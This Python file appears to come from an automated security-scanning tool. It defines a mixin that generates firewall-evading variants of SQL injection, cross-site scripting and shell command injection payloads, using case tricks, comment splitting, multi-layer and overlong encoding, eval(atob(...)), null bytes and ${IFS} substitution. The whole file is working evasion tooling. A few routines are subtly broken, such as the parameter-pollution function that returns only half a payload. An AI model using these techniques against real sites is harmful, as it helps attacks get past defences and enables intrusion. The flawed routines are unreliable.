"""
WAF Evasion Mixin - Provides payload obfuscation techniques to bypass Web Application Firewalls.
"""
import random
import string
from typing import List, Dict, Callable, Optional
from urllib.parse import quote, quote_plus
from enum import Enum


class ObfuscationType(str, Enum):
    """Types of obfuscation techniques."""
    CASE_VARIATION = "case"
    COMMENT_INJECTION = "comment"
    ENCODING = "encoding"
    DOUBLE_ENCODING = "double_encoding"
    UNICODE = "unicode"
    CONCATENATION = "concat"
    WHITESPACE = "whitespace"
    NULL_BYTE = "null_byte"
    HPP = "hpp"  # HTTP Parameter Pollution


class WAFEvasionMixin:
    """
    Mixin providing WAF evasion techniques for security agents.
    
    Usage:
        class MySQLiAgent(BaseSecurityAgent, WAFEvasionMixin):
            async def scan(self, ...):
                payloads = self.obfuscate_payload("' OR '1'='1", techniques=[
                    ObfuscationType.CASE_VARIATION,
                    ObfuscationType.COMMENT_INJECTION
                ])
    """
    
    # SQL keywords for comment injection
    SQL_KEYWORDS = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE', 'DROP']
    
    # XSS tags for obfuscation
    XSS_TAGS = ['script', 'img', 'svg', 'body', 'iframe', 'input', 'a', 'div']
    
    def obfuscate_payload(
        self,
        payload: str,
        techniques: Optional[List[ObfuscationType]] = None,
        payload_type: str = "generic"
    ) -> List[str]:
        """
        Generate obfuscated versions of a payload.
        
        Args:
            payload: Original payload
            techniques: List of obfuscation techniques to apply
            payload_type: Type of payload (sql, xss, generic)
            
        Returns:
            List of obfuscated payload variations
        """
        if techniques is None:
            techniques = list(ObfuscationType)
        
        results = [payload]  # Include original
        
        for technique in techniques:
            try:
                if technique == ObfuscationType.CASE_VARIATION:
                    results.extend(self._case_variation(payload))
                elif technique == ObfuscationType.COMMENT_INJECTION:
                    results.extend(self._comment_injection(payload, payload_type))
                elif technique == ObfuscationType.ENCODING:
                    results.extend(self._encoding_variations(payload))
                elif technique == ObfuscationType.DOUBLE_ENCODING:
                    results.extend(self._double_encoding(payload))
                elif technique == ObfuscationType.UNICODE:
                    results.extend(self._unicode_variations(payload))
                elif technique == ObfuscationType.CONCATENATION:
                    results.extend(self._concatenation(payload, payload_type))
                elif technique == ObfuscationType.WHITESPACE:
                    results.extend(self._whitespace_variations(payload, payload_type))
                elif technique == ObfuscationType.NULL_BYTE:
                    results.extend(self._null_byte_injection(payload))
                elif technique == ObfuscationType.HPP:
                    results.extend(self._parameter_pollution(payload))
            except Exception:
                # Skip technique on error
                pass
        
        return list(set(results))  # Remove duplicates
    
    def _case_variation(self, payload: str) -> List[str]:
        """Generate case variations."""
        variations = []
        
        # All uppercase
        variations.append(payload.upper())
        # All lowercase
        variations.append(payload.lower())
        
        # Random case
        random_case = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        variations.append(random_case)
        
        # Alternating case
        alternating = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        variations.append(alternating)
        
        return variations
    
    def _comment_injection(self, payload: str, payload_type: str) -> List[str]:
        """Inject comments to break up keywords."""
        variations = []
        
        if payload_type == "sql":
            # SQL comment styles
            for keyword in self.SQL_KEYWORDS:
                if keyword in payload.upper():
                    # Inline comment
                    commented = payload.replace(
                        keyword, 
                        keyword[:len(keyword)//2] + "/**/" + keyword[len(keyword)//2:]
                    )
                    variations.append(commented)
                    
                    # MySQL version comment
                    mysql_comment = payload.replace(
                        keyword,
                        f"/*!50000{keyword}*/"
                    )
                    variations.append(mysql_comment)
        
        elif payload_type == "xss":
            # HTML comment injection
            for tag in self.XSS_TAGS:
                if tag in payload.lower():
                    # Break up tag
                    broken = payload.replace(tag, tag[:1] + "<!---->" + tag[1:])
                    variations.append(broken)
        
        return variations
    
    def _encoding_variations(self, payload: str) -> List[str]:
        """Generate URL encoded variations."""
        variations = []
        
        # Standard URL encoding
        variations.append(quote(payload, safe=''))
        
        # Partial encoding (only special chars)
        partial = ""
        for c in payload:
            if c in "'\"\\/=<>":
                partial += quote(c, safe='')
            else:
                partial += c
        variations.append(partial)
        
        # Hex encoding
        hex_encoded = ''.join(f'%{ord(c):02x}' for c in payload)
        variations.append(hex_encoded)
        
        return variations
    
    def _double_encoding(self, payload: str) -> List[str]:
        """Double URL encode."""
        variations = []
        
        # Full double encoding
        single = quote(payload, safe='')
        double = quote(single, safe='')
        variations.append(double)
        
        # Triple encoding for aggressive WAFs
        triple = quote(double, safe='')
        variations.append(triple)
        
        return variations
    
    def _unicode_variations(self, payload: str) -> List[str]:
        """Generate Unicode/UTF-8 variations."""
        variations = []
        
        # UTF-8 encoding variations
        utf8_encoded = payload.encode('utf-8')
        
        # Wide Unicode (UTF-16 BE)
        try:
            wide = ""
            for c in payload:
                if c.isalpha():
                    wide += f"%u00{ord(c):02x}"
                else:
                    wide += c
            variations.append(wide)
        except:
            pass
        
        # Overlong UTF-8 (bypass some filters)
        # Example: '<' can be represented as %C0%BC
        overlong_map = {
            '<': '%C0%BC',
            '>': '%C0%BE',
            "'": '%C0%A7',
            '"': '%C0%A2',
            '/': '%C0%AF'
        }
        
        overlong = payload
        for char, replacement in overlong_map.items():
            overlong = overlong.replace(char, replacement)
        if overlong != payload:
            variations.append(overlong)
        
        return variations
    
    def _concatenation(self, payload: str, payload_type: str) -> List[str]:
        """Use concatenation to build payload."""
        variations = []
        
        if payload_type == "sql":
            # SQL string concatenation
            # 'admin' -> 'ad'+'min' (MSSQL)
            # 'admin' -> 'ad'||'min' (Oracle)
            # 'admin' -> CONCAT('ad','min') (MySQL)
            
            if "'" in payload:
                parts = payload.split("'")
                for i, part in enumerate(parts):
                    if len(part) > 3 and i > 0:
                        mid = len(part) // 2
                        # MSSQL style
                        mssql = payload.replace(part, f"{part[:mid]}'+'{part[mid:]}")
                        variations.append(mssql)
                        # Oracle style
                        oracle = payload.replace(part, f"{part[:mid]}'||'{part[mid:]}")
                        variations.append(oracle)
        
        elif payload_type == "xss":
            # JavaScript string building
            # "alert" -> "al"+"ert"
            # <script> -> String.fromCharCode(60,115,99,114,105,112,116,62)
            
            if "alert" in payload:
                variations.append(payload.replace("alert", 'al"+"ert'))
                variations.append(payload.replace("alert", "eval(atob('YWxlcnQ='))"))
            
            if "<script>" in payload.lower():
                # Use document.write with char codes
                script_chars = [60, 115, 99, 114, 105, 112, 116, 62]
                char_code_payload = f"String.fromCharCode({','.join(map(str, script_chars))})"
                variations.append(payload.replace("<script>", char_code_payload))
        
        return variations
    
    def _whitespace_variations(self, payload: str, payload_type: str) -> List[str]:
        """Use alternative whitespace characters."""
        variations = []
        
        # Tab instead of space
        variations.append(payload.replace(' ', '\t'))
        
        # Newline instead of space
        variations.append(payload.replace(' ', '\n'))
        
        # Carriage return
        variations.append(payload.replace(' ', '\r'))
        
        # Multiple spaces
        variations.append(payload.replace(' ', '  '))
        
        if payload_type == "sql":
            # SQL-specific: /**/ as space
            variations.append(payload.replace(' ', '/**/'))
            # +
            variations.append(payload.replace(' ', '+'))
        
        if payload_type == "xss":
            # HTML entities for space
            variations.append(payload.replace(' ', '&#x20;'))
            variations.append(payload.replace(' ', '&#32;'))
            # Forward slash in tags
            variations.append(payload.replace('<script', '<script/'))
        
        return variations
    
    def _null_byte_injection(self, payload: str) -> List[str]:
        """Inject null bytes."""
        variations = []
        
        # Null byte prefix
        variations.append('\x00' + payload)
        variations.append('%00' + payload)
        
        # Null byte suffix (useful for file extensions)
        variations.append(payload + '\x00')
        variations.append(payload + '%00')
        
        return variations
    
    def _parameter_pollution(self, payload: str) -> List[str]:
        """HTTP Parameter Pollution variations."""
        variations = []
        
        # Split payload across duplicate parameters
        if len(payload) > 2:
            mid = len(payload) // 2
            # These would be used as: param=first&param=second
            variations.append(f"{payload[:mid]}")  # First half marker
            
        return variations
    
    def get_sql_injection_variants(self, base_payload: str) -> List[str]:
        """Get SQL injection specific variants."""
        return self.obfuscate_payload(
            base_payload,
            techniques=[
                ObfuscationType.CASE_VARIATION,
                ObfuscationType.COMMENT_INJECTION,
                ObfuscationType.WHITESPACE,
                ObfuscationType.ENCODING,
                ObfuscationType.CONCATENATION
            ],
            payload_type="sql"
        )
    
    def get_xss_variants(self, base_payload: str) -> List[str]:
        """Get XSS specific variants."""
        return self.obfuscate_payload(
            base_payload,
            techniques=[
                ObfuscationType.CASE_VARIATION,
                ObfuscationType.ENCODING,
                ObfuscationType.UNICODE,
                ObfuscationType.WHITESPACE,
                ObfuscationType.CONCATENATION
            ],
            payload_type="xss"
        )
    
    def get_command_injection_variants(self, base_payload: str) -> List[str]:
        """Get command injection specific variants."""
        variations = [base_payload]
        
        # Environment variable substitution
        if "cat" in base_payload:
            variations.append(base_payload.replace("cat", "c${IFS}at"))
            variations.append(base_payload.replace("cat", "c'a't"))
            variations.append(base_payload.replace("cat", 'c"a"t'))
        
        # IFS (Internal Field Separator) variations
        variations.append(base_payload.replace(" ", "${IFS}"))
        variations.append(base_payload.replace(" ", "$IFS"))
        variations.append(base_payload.replace(" ", "{$IFS}"))
        
        # Brace expansion
        if "id" in base_payload:
            variations.append(base_payload.replace("id", "{i,d}"))
        
        # Tab/newline
        variations.append(base_payload.replace(" ", "\t"))
        variations.append(base_payload.replace(";", "\n"))
        
        # Encoding
        variations.extend(self._encoding_variations(base_payload))
        
        return list(set(variations))
